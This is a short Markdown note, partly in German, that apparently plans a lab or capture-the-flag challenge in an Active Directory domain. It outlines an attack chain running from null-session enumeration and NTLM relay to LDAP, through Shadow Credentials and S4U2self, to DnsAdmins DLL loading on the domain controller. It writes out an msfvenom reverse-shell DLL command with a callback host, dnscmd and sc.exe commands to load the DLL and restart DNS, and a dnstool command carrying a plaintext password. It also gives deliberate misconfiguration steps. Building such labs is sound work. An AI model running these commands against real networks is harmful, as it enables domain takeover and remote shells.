## Attack chain idea
1. Mit null auth --users enumerieren und user mit pw in description finden
2. Mit low priv user DNS Eintrag für HTTP relay erstellen
3. Coercion von SRV02
4. HTTP Relay von SRV02 zu ldap://DC01
5. ShadowCredentials um an SRV02$ zu kommen
6. Mit SRV02$ local admin mit s4u2self magic
7. DNS attack auf DC01 um shell zu bekommen (maybe über schtasks)

## DNS Exploit setup
1. DNS Service auf SRV02 installieren, damit dnscmd.exe da ist
2. Security Descriptor für DNS service aktualisieren für DNS Admins
3. Auf DC dem reg key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\SCM` "dns" hinzufügen, damit DNS Admins den DNS Service steuern können
4. (DC Rebooten)

Security Descriptor ACE:
(A;;0x0034;;;<DNS ADMINS SID>)

Registry key where DLL is loaded:
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`

### Befehle
 * Generate malicious dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f dll > pwn.dll`
 * Load DLL: `dnscmd.exe /config /serverlevelplugindll \\192.168.56.11\public\pwn.dll`
 * Stop DNS Service: `sc.exe \\DC01 stop dns`
 * Start DNS Service: `sc.exe \\DC01 start dns`
 * Add DNS entry: `python dnstool.py -u hack.lu\\ta_bort.mig -p 'LjtLNg37LdcZin73' ldaps://192.168.108.134 -port 636 -a add -r kali --data 192.168.108.128 -dns-ip 192.168.108.134`

## TODOs

* Beschreibung von low priv user auf Schwedisch verfassen